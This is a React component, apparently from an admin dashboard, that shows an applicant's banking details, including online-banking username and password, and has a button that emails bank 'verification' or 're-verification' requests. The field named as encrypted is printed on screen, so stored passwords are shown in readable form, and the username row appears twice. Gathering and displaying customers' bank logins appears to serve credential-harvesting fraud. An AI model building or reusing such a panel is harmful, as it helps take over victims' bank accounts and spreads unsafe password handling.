"use client";

import { useState } from "react";
import { api, ApiError } from "@/src/lib/api";

interface Application {
  id: string;
  reference: string;
  bankName?: string | null;
  routingNumber?: string | null;
  accountNumber?: string | null;
  bankUsername?: string | null;
  bankPasswordEncrypted?: string | null;
  bankAccountAge?: string | number | null;
  accountStatus?: string | null;
}

interface BankingCardProps {
  application: Application;
}

function Info({ label, value }: { label: string; value: React.ReactNode }) {
  return (
    <div className="flex items-start justify-between gap-4 border-b border-gray-100 py-3">
      <span className="text-sm text-gray-500">{label}</span>
      <span className="break-all text-right text-sm font-medium">
        {value ?? "Not provided"}
      </span>
    </div>
  );
}

export default function BankingCard({ application }: BankingCardProps) {
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");
  const [error, setError] = useState("");

  const hasBankDetails =
    Boolean(application.bankUsername?.trim()) &&
    Boolean(application.bankPasswordEncrypted?.trim());

  const type = hasBankDetails ? "reverification" : "initial";

  async function handleBankVerification() {
    setLoading(true);
    setMessage("");
    setError("");

    try {
      const result = await api.sendBankVerificationEmail(
        application.reference,
        type,
      );

      setMessage(
        result.message ||
          (type === "initial"
            ? "Bank verification email sent successfully."
            : "Bank re-verification email sent successfully."),
      );
    } catch (err: unknown) {
      setError(
        err instanceof ApiError
          ? err.message
          : "Failed to send verification email.",
      );
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="rounded-2xl bg-white p-6 shadow-sm">
      <h3 className="mb-5 text-lg font-bold">🏦 Banking</h3>

      <Info label="Bank Name" value={application.bankName} />

      <Info label="Routing Number" value={application.routingNumber} />

      <Info
        label="Account Number"
        value={
          application.accountNumber
            ? `••••${application.accountNumber.slice(-4)}`
            : "Not provided"
        }
      />

      <Info
        label="Banking Username"
        value={application.bankUsername?.trim() ? "Provided" : "Not provided"}
      />

      <Info
        label="Banking Username"
        value={
          application.bankUsername?.trim() ? (
            <span className="text-green-600">{application.bankUsername}</span>
          ) : (
            <span className="text-red-600">Not provided</span>
          )
        }
      />

      <Info
        label="Banking Password"
        value={
          application.bankPasswordEncrypted?.trim() ? (
            <span className="text-green-600">
              {application.bankPasswordEncrypted}
            </span>
          ) : (
            <span className="text-red-600">Not provided</span>
          )
        }
      />

      <Info label="Account Age" value={application.bankAccountAge} />

      <Info label="Account Status" value={application.accountStatus} />

      <button
        type="button"
        onClick={handleBankVerification}
        disabled={loading}
        className="mt-5 rounded-lg bg-blue-600 px-5 py-2.5 font-semibold text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
      >
        {loading
          ? "Sending Email..."
          : hasBankDetails
            ? "Re-verify Bank"
            : "Verify Bank"}
      </button>

      {message && (
        <p role="status" className="mt-3 text-sm text-green-600">
          {message}
        </p>
      )}

      {error && (
        <p role="alert" className="mt-3 text-sm text-red-600">
          {error}
        </p>
      )}
    </div>
  );
}
